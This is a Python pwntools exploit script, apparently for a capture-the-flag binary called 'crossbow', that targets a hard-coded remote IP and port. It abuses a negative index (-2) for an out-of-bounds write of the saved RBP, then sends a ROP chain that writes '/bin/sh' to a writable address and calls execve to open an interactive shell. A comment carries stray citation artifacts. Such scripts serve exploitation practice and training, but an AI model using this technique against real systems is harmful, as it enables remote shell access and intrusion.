#!/usr/bin/env python3
from pwn import *

# ——— CONFIGURATION ———
BINARY = "./crossbow"
REMOTE = ("94.237.53.203", 58550)

# ——— HELPERS ———
def start():
    if args.LOCAL:
        return process(BINARY)
    else:
        return remote(*REMOTE)

def pwn_target(target):
    """
    Perform the OOB write pivot, then ROP straight into execve("/bin/sh", 0, 0).
    """
    # 1) overwrite saved RBP via idx = -2
    target.recvuntil(b"Select target to shoot: ")
    target.sendline(b"-2")                                 # OOB → overwrite RBP :contentReference[oaicite:0]{index=0}&#8203;:contentReference[oaicite:1]{index=1}

    # 2) wait for the fgets prompt
    target.recvuntil(b"Give me your best warcry!!\n\n> ")

    # 3) build ROP payload
    padding                   = b"A" * 8                    # becomes new RBP (unused)
    pop_rax                   = p64(0x00404bc7)             # pop rax; ret
    mov_rax_to_rdi_ptr        = p64(0x004020f5)             # mov [rdi], rax; ret
    pop_rdi                   = p64(0x0040ac2d)             # pop rdi; ret
    pop_rsi                   = p64(0x004069b6)             # pop rsi; ret
    pop_rdx                   = p64(0x00401139)             # pop rdx; ret
    syscall_gadget            = p64(0x00405346)             # syscall; ret
    writable_addr             = p64(0x0040d1fa)             # .bss or other RW region
    bin_sh_str                = b"/bin/sh\x00"
    execve_syscall_number     = p64(59)

    rop_chain = b"".join([
        padding,

        # write "/bin/sh\x00" into memory at writable_addr
        pop_rax,
        bin_sh_str,
        pop_rdi,
        writable_addr,
        mov_rax_to_rdi_ptr,

        # set up execve args: rdi = ptr to "/bin/sh", rsi = 0, rdx = 0
        pop_rdi,
        writable_addr,
        pop_rsi,
        p64(0),
        pop_rdx,
        p64(0),

        # rax = 59 (execve syscall)
        pop_rax,
        execve_syscall_number,

        # invoke syscall → execve("/bin/sh", NULL, NULL)
        syscall_gadget
    ])

    # 4) send the ROP chain (use sendline so the final '\n' triggers the heap‐fgets return)
    #    Since we’re not injecting shellcode, the newline only closes out the heap‐fgets,
    #    and execution immediately jumps into our syscall chain.
    target.sendline(rop_chain)

    # 5) hand over to interactive shell
    target.interactive()

# ——— MAIN ———
if __name__ == "__main__":
    p = start()
    pwn_target(p)
